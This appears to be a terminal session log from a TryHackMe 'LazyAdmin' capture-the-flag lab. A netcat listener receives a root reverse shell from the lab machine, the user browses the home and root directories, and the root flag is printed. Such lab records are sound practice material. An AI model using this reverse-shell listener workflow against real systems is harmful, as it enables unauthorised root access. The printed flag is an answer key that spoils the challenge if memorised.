@@ -1,0 +1,39 @@
+Script started on 2021-04-03 16:21:52+05:30 [TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="203" LINES="53"]
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_lazyAdmin[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_lazyAdmin[00m$ nc -lvnp 7777
+Listening on 0.0.0.0 7777
+Connection received on 10.10.194.184 56522
+root@THM-Chal:/home/itguy# ls
+ls
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+Templates
+Videos
+backup.pl
+examples.desktop
+mysql_login.txt
+user.txt
+root@THM-Chal:/home/itguy# whoami
+whoami
+root
+root@THM-Chal:/home/itguy# cd /root
+cd /root
+root@THM-Chal:~# ls
+ls
+root.txt
+root@THM-Chal:~# cat root	
+cat root.txt 
+THM{6637f41d0177b6f37cb20d775124699f}
+root@THM-Chal:~# cat ro	      
+root@THM-Chal:~# 
+root@THM-Chal:~# 
+root@THM-Chal:~# exit
+exit
+exit
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_lazyAdmin[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_lazyAdmin[00m$ exit
+exit
+
+Script done on 2021-04-03 16:32:36+05:30 [COMMAND_EXIT_CODE="0"]
